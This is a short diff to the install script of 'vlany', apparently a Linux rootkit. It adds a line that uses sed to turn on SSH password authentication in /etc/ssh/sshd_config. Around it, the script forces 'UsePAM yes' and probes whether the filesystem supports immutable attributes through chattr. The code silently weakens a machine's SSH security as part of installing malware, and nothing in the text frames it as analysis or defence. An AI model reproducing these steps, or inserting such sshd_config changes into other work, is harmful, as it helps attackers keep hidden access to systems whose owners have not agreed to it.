@@ -71,6 +71,7 @@ gcc misc/detect_lxc.c -o misc/detect_lxc
 [ -d /proc/xen ] && { echo "Information: You're installing vlany on a Xen environment."; }
 [ ! -f /etc/ssh/sshd_config ] && { echo "/etc/ssh/sshd_config not found. ssh might not be installed. Install it."; exit; }
 [ ! "$(cat /etc/ssh/sshd_config | grep 'UsePAM')" == "UsePAM yes" ] && { echo "UsePAM yes" >> /etc/ssh/sshd_config; }
+[ ! "$(cat /etc/ssh/sshd_config | grep 'PasswordAuthentication yes')" == "PasswordAuthentication yes" ] && { sed -i -e 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config; }
 
 CHATTR_OUTPUT=$(touch children; chattr +ia children &>output; cat output)
 [[ $CHATTR_OUTPUT == *"Inappropriate ioctl"* ]] && { read -p "Warning: You're attempting to install vlany on a weird/alien filesystem. This is bad. Bailing."; exit; }
